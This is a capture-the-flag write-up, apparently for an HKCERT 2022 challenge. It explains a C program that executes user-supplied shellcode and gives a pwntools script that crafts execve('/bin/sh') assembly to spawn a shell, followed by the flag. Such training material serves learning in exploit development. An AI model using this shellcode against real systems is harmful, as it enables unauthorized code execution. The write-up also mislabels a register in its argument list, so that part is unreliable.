# Solution

## Understand the source code
At the start of the main function, the codes are mainly for initialization. 

```c
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  alarm(60);
}
...
int main() {
    int SIZE = 100;
    void *shellcode;
    unsigned long rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi;
    init();
    ...
```

The `setvbuf` calls in `init` function commonly appear in pwn challenges, which do not really affect the program logic. In most the time, we can ignore them.

The `alarm(60);` call forced the program to exit within 60 seconds. It's not important since solving the challenge by script usually costs several seconds only.

Then, we see

```c
int main() {
    ...
    shellcode = mmap((void *)0x13370000, SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    
    if ((long)shellcode == -1)
        _abort("mmap failed!\n");
    ...
```

`mmap` function is for asking the computer to allocate a chunk to store data. In this case, the code is allocating a chunk in memory address 0x13370000 to store the shellcode that is input by the user.

After that, 

```c
    ...
    asm(
        "movq %%rax, %0;"
        "movq %%rbx, %1;"
        "movq %%rcx, %2;"
        "movq %%rdx, %3;"
        "movq %%rbp, %4;"
        "movq %%rsp, %5;"
        "movq %%rsi, %6;"
        "movq %%rdi, %7;"
        : "=r" (rax), "=r" (rbx), "=r" (rcx), "=r" (rdx), "=r" (rbp), "=r" (rsp), "=r" (rsi), "=r" (rdi) : : "memory"
    );
    printf("Before running the shellcode:\nrax = 0x%lx\nrbx = 0x%lx\nrcx = 0x%lx\nrdx = 0x%lx\nrbp = 0x%lx\nrsp = 0x%lx\nrsi = 0x%lx\nrdi = 0x%lx\n",
        rax, rbx, rcx, rdx, rbp, rsp, rsi, rdi);
    ...
    asm(
        "movq %0, %%rax;"
        "movq %1, %%rbx;"
        "movq %2, %%rcx;"
        "movq %3, %%rdx;"
        "movq %4, %%rbp;"
        "movq %5, %%rsp;"
        "movq %6, %%rsi;"
        "movq %7, %%rdi;"
        ::"m"(rax), "m"(rbx), "m"(rcx), "m"(rdx), "m"(rbp), "m"(rsp), "m"(rsi), "m"(rdi)
    );
    ...
```

this part of the code is for printing the current register values. It will be useful when address randomization protections are enabled.

Finally, the remaining code

```c
    ...
    printf("\nInput your shellcode here (max: 100): ");
    if (read(0, shellcode, SIZE - 1) == 0)
        _abort("read failed!\n");
    ...
    ((void_fn) shellcode)();
}
```

aims to read and run the user input shellcode.

## Vulnerability analysis

There is no bug in this program but running user input shellcode is dangerous, it literally means the user can do anything (run any code) in the server. Therefore, this type of pwn challenge aims to test the ctf player's ability to craft a shellcode to read flag or to spawn a shell.

## Crafting shellcode
We can easily genreate shellcode by assembly through pwntools:

```python
from pwn import *

assembly = '''
    mov rax, 0x3b
    xor rsi, rsi
'''

shellcode = asm(assembly, 'amd64')
...
```

Crafting assembly to spawn a shell is easier that crafing assembly to read the flag file, so this write-up only focus on spawning a shell.

To spawn a shell,we need `syscall`. `syscall` is a small library function that invokes the system call whose assembly language interface has the specified number with the specified arguments. There is a powerful syscall named `execve` which can let you execute arbitrary command, so if you can exec `/bin/sh`, a shell will spwan to you.

By checking at the syscall table: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md, `execve('/bin/sh', null, null)` need
- rax=0x3b
- rdi=poninter pointing at the string '/bin/sh'
- rsi=0
- rdi=0

Then we can craft an assembly to acheive this:

```python
from pwn import *

assembly = '''
    mov rax, 0x3b
    mov rdi, (0x13370000+90)
    xor rsi, rsi
    xor rdx, rdx
    syscall
'''

shellcode = asm(assembly, 'amd64')
shellcode = shellcode.ljust(90) + b'/bin/sh\x00'
...
```
Here I fill rdi with \(0x13370000+90\), and then make sure '/bin/sh\x00' is start at (0x13370000+90\) by `shellcode = shellcode.ljust(90) + b'/bin/sh\x00'` since I know that the start of my shellcode is at 0x13370000.

Finally, we just feed the generated shellcode the program and let the program run it for me.

## Full solve script

```python
from pwn import *

shellcode = asm('''
    mov rax, 0x3b
    mov rdi, (0x13370000+90)
    xor rsi, rsi
    xor rdx, rdx
    syscall
''', 'amd64')
shellcode = shellcode.ljust(90) + b'/bin/sh\x00'

p = process('./chall')
p.sendlineafter('(max: 100): ', shellcode)
p.interactive()
```

## Flag
`hkcert22{At_1e4st_You_know_a5M}`
